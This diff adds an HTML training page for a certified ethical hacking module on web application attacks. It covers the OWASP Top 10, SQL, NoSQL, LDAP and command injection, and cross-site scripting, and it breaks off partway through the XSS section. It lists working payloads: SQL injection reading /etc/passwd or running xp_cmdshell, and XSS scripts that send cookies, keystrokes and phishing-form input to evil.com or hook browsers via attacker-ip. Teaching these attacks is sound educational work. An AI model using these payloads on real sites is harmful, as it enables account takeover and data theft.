@@ -1,0 +1,2433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH v13 Module 14: Hacking Web Applications</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --warning-color: #f39c12;
+            --success-color: #27ae60;
+            --dark-bg: #34495e;
+            --light-bg: #ecf0f1;
+            --text-dark: #2c3e50;
+            --text-light: #ffffff;
+            --gradient-primary: linear-gradient(135deg, #667eea, #764ba2);
+            --gradient-secondary: linear-gradient(135deg, #f093fb, #f5576c);
+            --gradient-success: linear-gradient(135deg, #4ecdc4, #44a08d);
+            --gradient-warning: linear-gradient(135deg, #ffeaa7, #fab1a0);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-dark);
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            margin-bottom: 30px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+
+        .progress-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 25px;
+            padding: 5px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            background: var(--gradient-success);
+            height: 30px;
+            border-radius: 20px;
+            width: 0%;
+            transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            position: relative;
+        }
+
+        .progress-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            color: white;
+            font-weight: bold;
+            mix-blend-mode: difference;
+        }
+
+        .navigation {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .nav-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            backdrop-filter: blur(5px);
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: rgba(255, 255, 255, 0.8);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .content-area {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin-bottom: 30px;
+        }
+
+        .module-section {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .module-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-title {
+            color: var(--primary-color);
+            font-size: 2.2em;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 3px solid var(--secondary-color);
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 0;
+            width: 50px;
+            height: 3px;
+            background: var(--accent-color);
+        }
+
+        .card {
+            background: var(--light-bg);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-left: 5px solid var(--secondary-color);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .card h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            font-size: 1.4em;
+        }
+
+        .highlight-box {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border-left: 5px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .warning-box {
+            background: var(--gradient-warning);
+            color: var(--text-dark);
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border-left: 5px solid var(--warning-color);
+        }
+
+        .success-box {
+            background: var(--gradient-success);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border-left: 5px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .vulnerability-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .vuln-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-top: 4px solid var(--accent-color);
+            transition: transform 0.3s ease;
+        }
+
+        .vuln-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .vuln-card h4 {
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+            overflow-x: auto;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: white;
+        }
+
+        .btn-success {
+            background: var(--gradient-success);
+            color: white;
+        }
+
+        .btn-warning {
+            background: var(--gradient-warning);
+            color: var(--text-dark);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .tool-showcase {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .tool-card {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .tool-card:hover {
+            transform: scale(1.05);
+        }
+
+        .quiz-container {
+            background: var(--light-bg);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+
+        .question {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .question h4 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        .options {
+            list-style: none;
+        }
+
+        .options li {
+            background: var(--light-bg);
+            margin: 8px 0;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .options li:hover {
+            background: var(--secondary-color);
+            color: white;
+        }
+
+        .options li.selected {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .options li.correct {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .options li.incorrect {
+            background: var(--accent-color);
+            color: white;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: white;
+            margin: 5% auto;
+            padding: 30px;
+            border-radius: 15px;
+            width: 80%;
+            max-width: 600px;
+            position: relative;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            top: 15px;
+            right: 20px;
+        }
+
+        .close:hover {
+            color: var(--accent-color);
+        }
+
+        .attack-demo {
+            background: #f8f9fa;
+            border: 2px dashed #dee2e6;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            text-align: center;
+        }
+
+        .attack-demo h4 {
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .metric-card {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .metric-value {
+            font-size: 2em;
+            font-weight: bold;
+            display: block;
+        }
+
+        .resource-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .resource-link {
+            background: var(--light-bg);
+            padding: 15px;
+            border-radius: 10px;
+            text-decoration: none;
+            color: var(--text-dark);
+            transition: transform 0.3s ease;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .resource-link:hover {
+            transform: translateX(5px);
+            background: var(--secondary-color);
+            color: white;
+        }
+
+        .timer-display {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            z-index: 100;
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .navigation {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .nav-btn {
+                width: 100%;
+                max-width: 300px;
+            }
+            
+            .vulnerability-grid,
+            .tool-showcase,
+            .metrics-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .timer-display {
+                position: relative;
+                top: auto;
+                right: auto;
+                margin: 10px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="timer-display" id="quizTimer">Time Remaining: 45:00</div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>CEH v13 Module 14</h1>
+            <p>Hacking Web Applications</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar">
+                    <span class="progress-text" id="progressText">Progress: 0% Complete</span>
+                </div>
+            </div>
+            <div style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.8);">
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    ← → Navigate Sections
+                </span>
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    Esc Close Modal
+                </span>
+            </div>
+        </div>
+
+        <!-- Navigation -->
+        <div class="navigation">
+            <button class="nav-btn active" onclick="showSection('overview')">Overview</button>
+            <button class="nav-btn" onclick="showSection('web-basics')">Web App Basics</button>
+            <button class="nav-btn" onclick="showSection('owasp-top10')">OWASP Top 10</button>
+            <button class="nav-btn" onclick="showSection('injection-attacks')">Injection Attacks</button>
+            <button class="nav-btn" onclick="showSection('xss-attacks')">XSS Attacks</button>
+            <button class="nav-btn" onclick="showSection('csrf-attacks')">CSRF Attacks</button>
+            <button class="nav-btn" onclick="showSection('auth-attacks')">Authentication</button>
+            <button class="nav-btn" onclick="showSection('tools')">Testing Tools</button>
+            <button class="nav-btn" onclick="showSection('countermeasures')">Countermeasures</button>
+            <button class="nav-btn" onclick="showSection('quiz')">Assessment</button>
+        </div>
+
+        <!-- Content Area -->
+        <div class="content-area">
+            <!-- Overview Section -->
+            <div id="overview" class="module-section active">
+                <h2 class="section-title">Module 14 Overview</h2>
+                
+                <div class="card">
+                    <h3>Web Application Security: The Digital Battleground</h3>
+                    <p>Welcome to CEH v13 Module 14! Web applications have become the backbone of modern digital business, processing millions of transactions, storing sensitive data, and connecting users worldwide. However, with great connectivity comes great vulnerability.</p>
+                    
+                    <div class="highlight-box">
+                        <h4>Learning Objectives</h4>
+                        <p>By the end of this module, you will master:</p>
+                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
+                            <li><strong>Web Application Architecture:</strong> Understanding client-server communication</li>
+                            <li><strong>OWASP Top 10 Vulnerabilities:</strong> Current threat landscape analysis</li>
+                            <li><strong>Injection Attack Techniques:</strong> SQL, NoSQL, LDAP, and command injection</li>
+                            <li><strong>Cross-Site Scripting (XSS):</strong> Reflected, stored, and DOM-based attacks</li>
+                            <li><strong>CSRF Attack Vectors:</strong> Session riding and request forgery</li>
+                            <li><strong>Authentication Bypass:</strong> Session management vulnerabilities</li>
+                            <li><strong>Security Testing Tools:</strong> Burp Suite, OWASP ZAP, and modern AI-powered tools</li>
+                            <li><strong>Defense Strategies:</strong> Secure coding and protection mechanisms</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="metrics-grid">
+                    <div class="metric-card">
+                        <span class="metric-value">43%</span>
+                        <div>of data breaches involve web applications</div>
+                    </div>
+                    <div class="metric-card">
+                        <span class="metric-value">$4.45M</span>
+                        <div>Average cost of a data breach in 2024</div>
+                    </div>
+                    <div class="metric-card">
+                        <span class="metric-value">76%</span>
+                        <div>of websites have at least one vulnerability</div>
+                    </div>
+                    <div class="metric-card">
+                        <span class="metric-value">3.5B</span>
+                        <div>Web application attacks blocked daily</div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h4>Critical Security Statistics</h4>
+                    <p>According to Verizon's 2024 Data Breach Investigations Report, web applications remain the most attacked vector in cybersecurity. Understanding these vulnerabilities isn't just academic—it's essential for protecting modern digital infrastructure.</p>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('web-basics')">Begin Learning Journey</button>
+            </div>
+
+            <!-- Web Application Basics Section -->
+            <div id="web-basics" class="module-section">
+                <h2 class="section-title">Web Application Architecture & Fundamentals</h2>
+
+                <div class="card">
+                    <h3>Web Application Components</h3>
+                    <div class="vulnerability-grid">
+                        <div class="vuln-card">
+                            <h4>Client-Side (Frontend)</h4>
+                            <ul>
+                                <li><strong>HTML:</strong> Structure and content</li>
+                                <li><strong>CSS:</strong> Styling and presentation</li>
+                                <li><strong>JavaScript:</strong> Dynamic behavior</li>
+                                <li><strong>Frameworks:</strong> React, Angular, Vue.js</li>
+                            </ul>
+                        </div>
+                        <div class="vuln-card">
+                            <h4>Server-Side (Backend)</h4>
+                            <ul>
+                                <li><strong>Web Servers:</strong> Apache, Nginx, IIS</li>
+                                <li><strong>Application Servers:</strong> Tomcat, Node.js</li>
+                                <li><strong>Languages:</strong> PHP, Python, Java, .NET</li>
+                                <li><strong>APIs:</strong> REST, GraphQL, SOAP</li>
+                            </ul>
+                        </div>
+                        <div class="vuln-card">
+                            <h4>Database Layer</h4>
+                            <ul>
+                                <li><strong>Relational:</strong> MySQL, PostgreSQL, SQL Server</li>
+                                <li><strong>NoSQL:</strong> MongoDB, Redis, CouchDB</li>
+                                <li><strong>In-Memory:</strong> Memcached, Redis</li>
+                                <li><strong>Cloud:</strong> AWS RDS, Azure SQL</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>HTTP Protocol & Request/Response Cycle</h3>
+                    <p>Understanding HTTP is crucial for web application security testing:</p>
+                    
+                    <div class="code-block">
+GET /login.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml
+Cookie: sessionid=abc123def456
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>Key HTTP Components for Security Testing</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Headers:</strong> Authentication, session management</li>
+                            <li><strong>Cookies:</strong> Session tokens, preferences</li>
+                            <li><strong>Parameters:</strong> GET/POST data, JSON payloads</li>
+                            <li><strong>Status Codes:</strong> Error messages, redirects</li>
+                            <li><strong>HTTPS/TLS:</strong> Encryption and certificates</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Same-Origin Policy & Cross-Origin Concepts</h3>
+                    <p>Fundamental security concepts that govern how web applications interact:</p>
+                    
+                    <div class="vuln-card">
+                        <h4>Same-Origin Policy</h4>
+                        <p>Restricts how documents/scripts from one origin can interact with resources from another origin. Origins must match:</p>
+                        <ul>
+                            <li><strong>Protocol:</strong> http:// vs https://</li>
+                            <li><strong>Domain:</strong> example.com vs subdomain.example.com</li>
+                            <li><strong>Port:</strong> :80 vs :8080</li>
+                        </ul>
+                    </div>
+
+                    <div class="code-block">
+// Same Origin Examples:
+// ✅ https://example.com/page1 → https://example.com/page2
+// ❌ https://example.com → http://example.com (different protocol)
+// ❌ https://example.com → https://api.example.com (different subdomain)
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('owasp-top10')">Next: OWASP Top 10</button>
+            </div>
+
+            <!-- OWASP Top 10 Section -->
+            <div id="owasp-top10" class="module-section">
+                <h2 class="section-title">OWASP Top 10 Web Application Security Risks</h2>
+
+                <div class="card">
+                    <h3>OWASP Top 10 2021 (Current Standard)</h3>
+                    <p>The Open Web Application Security Project (OWASP) maintains the definitive list of web application security risks:</p>
+                </div>
+
+                <div class="vulnerability-grid">
+                    <div class="vuln-card" style="border-top-color: #e74c3c;">
+                        <h4>1. A01 - Broken Access Control</h4>
+                        <p><strong>Risk:</strong> Unauthorized access to restricted functionality</p>
+                        <p><strong>Example:</strong> Accessing admin panels, viewing other users' data</p>
+                        <p><strong>Impact:</strong> Data breach, privilege escalation</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #e67e22;">
+                        <h4>2. A02 - Cryptographic Failures</h4>
+                        <p><strong>Risk:</strong> Weak encryption, exposed sensitive data</p>
+                        <p><strong>Example:</strong> Plain text passwords, weak SSL/TLS</p>
+                        <p><strong>Impact:</strong> Data exposure, man-in-the-middle attacks</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #f39c12;">
+                        <h4>3. A03 - Injection</h4>
+                        <p><strong>Risk:</strong> Malicious code execution through input</p>
+                        <p><strong>Example:</strong> SQL injection, command injection</p>
+                        <p><strong>Impact:</strong> Database compromise, system takeover</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #27ae60;">
+                        <h4>4. A04 - Insecure Design</h4>
+                        <p><strong>Risk:</strong> Flawed security architecture</p>
+                        <p><strong>Example:</strong> Missing security controls by design</p>
+                        <p><strong>Impact:</strong> Fundamental security weaknesses</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #16a085;">
+                        <h4>5. A05 - Security Misconfiguration</h4>
+                        <p><strong>Risk:</strong> Improperly configured security settings</p>
+                        <p><strong>Example:</strong> Default passwords, verbose errors</p>
+                        <p><strong>Impact:</strong> Unauthorized access, information disclosure</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #2980b9;">
+                        <h4>6. A06 - Vulnerable Components</h4>
+                        <p><strong>Risk:</strong> Using components with known vulnerabilities</p>
+                        <p><strong>Example:</strong> Outdated libraries, unpatched frameworks</p>
+                        <p><strong>Impact:</strong> System compromise, remote code execution</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #8e44ad;">
+                        <h4>7. A07 - Authentication Failures</h4>
+                        <p><strong>Risk:</strong> Broken authentication mechanisms</p>
+                        <p><strong>Example:</strong> Weak passwords, session hijacking</p>
+                        <p><strong>Impact:</strong> Account takeover, identity theft</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #c0392b;">
+                        <h4>8. A08 - Software Integrity Failures</h4>
+                        <p><strong>Risk:</strong> Unverified code and updates</p>
+                        <p><strong>Example:</strong> Unsigned plugins, supply chain attacks</p>
+                        <p><strong>Impact:</strong> Malicious code execution</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #d35400;">
+                        <h4>9. A09 - Logging & Monitoring Failures</h4>
+                        <p><strong>Risk:</strong> Insufficient logging and incident response</p>
+                        <p><strong>Example:</strong> No audit logs, delayed breach detection</p>
+                        <p><strong>Impact:</strong> Extended breach duration, compliance violations</p>
+                    </div>
+
+                    <div class="vuln-card" style="border-top-color: #7f8c8d;">
+                        <h4>10. A10 - Server-Side Request Forgery</h4>
+                        <p><strong>Risk:</strong> Tricking server into making malicious requests</p>
+                        <p><strong>Example:</strong> Internal network scanning, cloud metadata access</p>
+                        <p><strong>Impact:</strong> Internal system compromise</p>
+                    </div>
+                </div>
+
+                <div class="highlight-box">
+                    <h4>OWASP Top 10 Evolution</h4>
+                    <p>Key changes from 2017 to 2021:</p>
+                    <ul style="line-height: 1.8;">
+                        <li><strong>New #1:</strong> Broken Access Control (previously #5)</li>
+                        <li><strong>Combined:</strong> Cryptographic Failures (sensitive data exposure + crypto failures)</li>
+                        <li><strong>New Entry:</strong> Insecure Design (A04)</li>
+                        <li><strong>New Entry:</strong> Software and Data Integrity Failures (A08)</li>
+                        <li><strong>Renamed:</strong> SSRF moves from XXE category to standalone (A10)</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('injection-attacks')">Next: Injection Attacks</button>
+            </div>
+
+            <!-- Injection Attacks Section -->
+            <div id="injection-attacks" class="module-section">
+                <h2 class="section-title">Injection Attacks: Code Execution Through Input</h2>
+
+                <div class="card">
+                    <h3>SQL Injection (SQLi) - The Classic Attack</h3>
+                    <p>SQL injection remains one of the most dangerous and common web application vulnerabilities:</p>
+                    
+                    <div class="highlight-box">
+                        <h4>SQL Injection Types</h4>
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>Classic SQLi</strong><br>
+                                Direct SQL query manipulation
+                            </div>
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>Blind SQLi</strong><br>
+                                No visible error messages
+                            </div>
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>Time-based</strong><br>
+                                Using delays to confirm injection
+                            </div>
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>Union-based</strong><br>
+                                Combining queries with UNION
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="attack-demo">
+                        <h4>Vulnerable Code Example</h4>
+                        <div class="code-block">
+// Vulnerable PHP code
+$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
+
+// Attack payload: admin'-- 
+// Results in: SELECT * FROM users WHERE username = 'admin'-- ' AND password = ''
+// The -- comments out the password check!
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>SQL Injection Attack Vectors</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Authentication Bypass:</strong> ' OR '1'='1</li>
+                            <li><strong>Data Extraction:</strong> UNION SELECT password FROM admin_users</li>
+                            <li><strong>Database Enumeration:</strong> ' UNION SELECT version(),database(),user()--</li>
+                            <li><strong>File System Access:</strong> ' UNION SELECT LOAD_FILE('/etc/passwd')--</li>
+                            <li><strong>Command Execution:</strong> '; EXEC xp_cmdshell('dir')--</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>NoSQL Injection</h3>
+                    <p>Modern NoSQL databases introduce new injection vectors:</p>
+                    
+                    <div class="code-block">
+// MongoDB injection example
+// Vulnerable Node.js code
+db.users.find({ username: req.body.username, password: req.body.password });
+
+// Attack payload in JSON:
+// {"username": {"$ne": ""}, "password": {"$ne": ""}}
+// This bypasses authentication by using "not equal" operators
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Command Injection</h3>
+                    <p>Executing system commands through vulnerable input processing:</p>
+                    
+                    <div class="vulnerability-grid">
+                        <div class="vuln-card">
+                            <h4>Linux Command Injection</h4>
+                            <div class="code-block">
+# Vulnerable code: ping command
+ping $user_input
+
+# Attack payloads:
+; cat /etc/passwd
+&& whoami
+| ls -la /
+`id`
+$(uname -a)
+                            </div>
+                        </div>
+
+                        <div class="vuln-card">
+                            <h4>Windows Command Injection</h4>
+                            <div class="code-block">
+# Vulnerable code: dir command
+dir %user_input%
+
+# Attack payloads:
+& type c:\windows\system32\drivers\etc\hosts
+&& net user
+| dir c:\
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>LDAP Injection</h3>
+                    <p>Manipulating LDAP queries for directory service attacks:</p>
+                    
+                    <div class="code-block">
+// Vulnerable LDAP query
+"(&(uid=" + username + ")(password=" + password + "))"
+
+// Attack payload: admin)(|(uid=*
+// Results in: (&(uid=admin)(|(uid=*)(password=password))
+// This creates an OR condition that always evaluates to true
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('xss-attacks')">Next: XSS Attacks</button>
+            </div>
+
+            <!-- XSS Attacks Section -->
+            <div id="xss-attacks" class="module-section">
+                <h2 class="section-title">Cross-Site Scripting (XSS) Attacks</h2>
+
+                <div class="card">
+                    <h3>XSS Attack Types & Mechanisms</h3>
+                    <p>Cross-Site Scripting allows attackers to inject malicious scripts into web applications that are then executed by victim browsers.</p>
+
+                    <div class="vulnerability-grid">
+                        <div class="vuln-card" style="border-top-color: #e74c3c;">
+                            <h4>Reflected XSS (Non-Persistent)</h4>
+                            <ul style="line-height: 1.6;">
+                                <li>Payload reflected immediately in response</li>
+                                <li>Requires social engineering (malicious link)</li>
+                                <li>Not stored on server</li>
+                                <li>Single-request attack</li>
+                            </ul>
+                            <div class="code-block">
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+javascript:alert('XSS')
+                            </div>
+                        </div>
+
+                        <div class="vuln-card" style="border-top-color: #e67e22;">
+                            <h4>Stored XSS (Persistent)</h4>
+                            <ul style="line-height: 1.6;">
+                                <li>Payload stored in database/server</li>
+                                <li>Executes for every user viewing content</li>
+                                <li>More dangerous than reflected</li>
+                                <li>Common in comments, forums, profiles</li>
+                            </ul>
+                            <div class="code-block">
+&lt;script&gt;
+document.location='http://evil.com/steal.php?cookie='+document.cookie
+&lt;/script&gt;
+                            </div>
+                        </div>
+
+                        <div class="vuln-card" style="border-top-color: #f39c12;">
+                            <h4>DOM-Based XSS</h4>
+                            <ul style="line-height: 1.6;">
+                                <li>Payload executes via DOM manipulation</li>
+                                <li>Never sent to server</li>
+                                <li>Client-side only vulnerability</li>
+                                <li>Difficult to detect with traditional scanners</li>
+                            </ul>
+                            <div class="code-block">
+// Vulnerable JavaScript
+document.write(location.hash.substring(1));
+
+// Attack URL:
+http://site.com/page#&lt;script&gt;alert('XSS')&lt;/script&gt;
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>XSS Attack Payloads & Techniques</h3>
+                    
+                    <div class="highlight-box">
+                        <h4>Common XSS Payloads</h4>
+                        <div class="code-block">
+<!-- Basic Alert -->
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+<!-- Cookie Theft -->
+&lt;script&gt;new Image().src='http://evil.com/steal.php?c='+document.cookie;&lt;/script&gt;
+
+<!-- Keylogger -->
+&lt;script&gt;
+document.addEventListener('keydown', function(e) {
+    new Image().src='http://evil.com/log.php?key=' + e.key;
+});
+&lt;/script&gt;
+
+<!-- Session Hijacking -->
+&lt;script&gt;fetch('http://evil.com/hijack', {method:'POST', body:document.cookie});&lt;/script&gt;
+
+<!-- Phishing -->
+&lt;script&gt;
+document.body.innerHTML = '&lt;div&gt;Login expired. &lt;form action="http://evil.com/phish"&gt;&lt;input name="user"&gt;&lt;input name="pass" type="password"&gt;&lt;input type="submit"&gt;&lt;/form&gt;&lt;/div&gt;';
+&lt;/script&gt;
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>Filter Evasion Techniques</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Case Variation:</strong> &lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</li>
+                            <li><strong>HTML Encoding:</strong> &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</li>
+                            <li><strong>URL Encoding:</strong> %3Cscript%3Ealert('XSS')%3C/script%3E</li>
+                            <li><strong>Unicode:</strong> \\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e</li>
+                            <li><strong>Event Handlers:</strong> &lt;img src=x onerror=alert('XSS')&gt;</li>
+                            <li><strong>JavaScript URI:</strong> javascript:alert('XSS')</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Advanced XSS Techniques</h3>
+                    
+                    <div class="attack-demo">
+                        <h4>BeEF Framework Integration</h4>
+                        <div class="code-block">
+&lt;script src="http://attacker-ip:3000/hook.js"&gt;&lt;/script&gt;
+
+// This hooks the victim's browser to the BeEF framework
+// Allowing remote control and advanced exploitation
+                        </div>
+                    </div>
+
+                    <div class="success-box">
+                        <h4>XSS Impact & Business Risk</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Account Takeover:</strong> Session hijacking and credential theft</li>
+                            <li><strong>Data Exfiltration:</strong> Stealing sensitive user information</li>
+                            <li><strong>Malware Distribution:</strong> Drive-by downloads and infections</li>
+                            <li><strong>Phishing Attacks:</strong> Creating fake login forms</li>
+                            <li><strong>Defacement:</strong> Altering website content and reputation damage</li>
+                            <li><strong>Compliance Violations:</strong> PCI-DSS, GDPR, and regulatory penalties</li>
+                        </ul>
+                    </div>
+                </div>
+
